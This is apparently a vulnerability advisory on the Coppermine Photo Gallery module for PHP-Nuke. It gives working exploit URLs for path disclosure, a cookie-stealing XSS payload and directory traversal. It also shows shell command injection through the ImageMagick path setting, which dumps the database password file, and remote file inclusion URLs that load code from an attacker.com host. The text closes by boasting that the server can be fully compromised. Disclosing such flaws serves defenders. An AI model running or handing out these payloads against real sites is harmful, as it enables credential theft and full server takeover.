Vulnerabilities:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

A. Full path disclosure:

Many scripts in Coppermine software package are not protected against direct access,
therefore standard php error messages can be provoked, which leads to exposure the \
full path to the scripts. Such piece of information has great value for potential \
attacker, who will use this in next steps of hacking.

Version scope: both new and old versions are affected.

Examples:

<http://localhost/nuke72/modules/coppermine/phpinfo.php>
<http://localhost/nuke72/modules/coppermine/addpic.php>
<http://localhost/nuke72/modules/coppermine/config.php>
<http://localhost/nuke72/modules/coppermine/db_input.php>
<http://localhost/nuke72/modules/coppermine/displayecard.php>
<http://localhost/nuke72/modules/coppermine/ecard.php>
<http://localhost/nuke72/modules/coppermine/include/crop.inc.php>

B. Cross-site scripting aka XSS:

Can be used by potential attacker for stealing cookies and doing other operations, \
which in normal conditions are not permitted by browser's cross-domain security \
restrictions.

Version scope: only new version is affected.

Examples:

<http://localhost/nuke72/modules/coppermine/docs/menu.inc.php?CPG_URL=foobar>">[xss \
code here] <http://localhost/nuke72/modules/coppermine/docs/menu.inc.php?CPG_URL=foobar>"><body%20onload=alert(document.cookie);>

C. Arbitrary directory browsing (needs nuke admin rights!):

PhpNuke is known by the many security bugs, leading to admin account overtaking by \
attacker. So needing of the admin rights to use this exploit is not such big \
restriction ...

Version scope: both new and old versions are affected.

Example:

<http://localhost/nuke72/modules.php?name=coppermine&file=searchnew&startdir=../..>

... and we can see PhpNuke's root directory structure ;)

D. Execution of the arbitrary shell commands in server (needs nuke admin rights!):

Yes, again we need PhpNuke admin privileges to accomplish this exploit, but as said \
before, there are many ways to compromise nuke's admin account.

Version scope: both new and old versions are affected.

So, how we can give any shell commands to server?
Let's look at Coppermine's original source in \
"coppermine/include/picmgmtbatch.inc.php":

// Method for thumbnails creation
    switch ($method) {
        case "im" :
          if (preg_match("#[A-Z]:|\\\\#Ai", __FILE__)) {
            // get the basedir, remove '/include'
            $cur_dir = "";
            $src_file = '"' . strtr($src_file, '/', '\\') . '"';
            $im_dest_file = str_replace('%', '%%', ('"' . strtr($dest_file, '/', \
'\\') . '"'));  } else {
            $src_file = escapeshellarg($src_file);
            $im_dest_file = str_replace('%', '%%', escapeshellarg($dest_file));
          }

          $output = array();
          $cmd = "{$CONFIG['impath']}convert -quality {$CONFIG['jpeg_qual']} \
{$CONFIG['im_options']} -geometry {$destWidth}x{$destHeight} $src_file \
$im_dest_file";
		  //die("$cmd");

		  exec ($cmd, $output, $retval);

          if ($retval) {
            $ERROR = "Error executing ImageMagick - Return value: $retval";
            if ($CONFIG['debug_mode']) {

As we can see, there is very dangerous php function "exec()" in use and some user \
input - variables "$src_file" and "$dest_file" - are sanitized by "escapeshellarg()". \
All seems to be ok? Yes... oops... what about config variables "$CONFIG['impath']", \
"$CONFIG['jpeg_qual']" etc ? Coppermine's authors were assuming, that those variables \
are safe to use directly in "exec()"... But if we have nuke admin rights, we can \
manipulate those configuration parameters and therefore various shell commands can be \
injected to "exec()"! You wanna details? Go to Coopermine's conficuration panel and \
set "Method for resizing images" to "Image Magick". Next set "Path to ImageMagick" to \
value, which includes shell command, you want to execute in server. Example "path" in \
case of windows server: "type config.php > config.txt &" , linux server: "cat \
config.php > config.txt ;" . Now "save new configuration", then upload some pictures \
to server and go to "Batch add pictures". And if all went right, then you will see \
"config.txt" file in phpnuke root directory, so anyone can see in plaintext \
information with critical value - database name, username and password ;) Of course, \
skilled attacker can within 5 minutes get remote shell running in server through \
arbitrary port (higher than 1024) and next hacking is not logged anymore, because \
webserver is bypassed. One more step - finding and using local r00t exploit - and \
server is 0wned ;)

E. Remote file inclusion:

Version scope: both new and old versions are affected (different bugs in different \
scripts).

There exists remote file inclusion vulnerabilities in Coppermine Photo Gallery, which
can lead to arbitrary php code parsing, shell commands injection, etc. And as \
discussed before, finally this can lead to total compromise of the victim server.

E1 - affected is old version:

First get ready your php script in "<http://attacker.com/include/functions.inc.php>" \
and then:

<http://localhost/nuke69j1/modules/coppermine/include/init.inc.php?CPG_M_DIR=http://attacker.com>

E2 - affected is new version:

First get ready your php script in "<http://attacker.com/user_list_info_box.inc>" and \
then:

<http://localhost/nuke72/modules/coppermine/themes/default/theme.php?THEME_DIR=http://attacker.com>
 <http://localhost/nuke72/modules/coppermine/themes/coppercop/theme.php?THEME_DIR=http://attacker.com>
 <http://localhost/nuke72/modules/coppermine/themes/maze/theme.php?THEME_DIR=http://attacker.com>

Of course, attacker's server, where those scripts are, must NOT PARSE PHP!!

See ya!
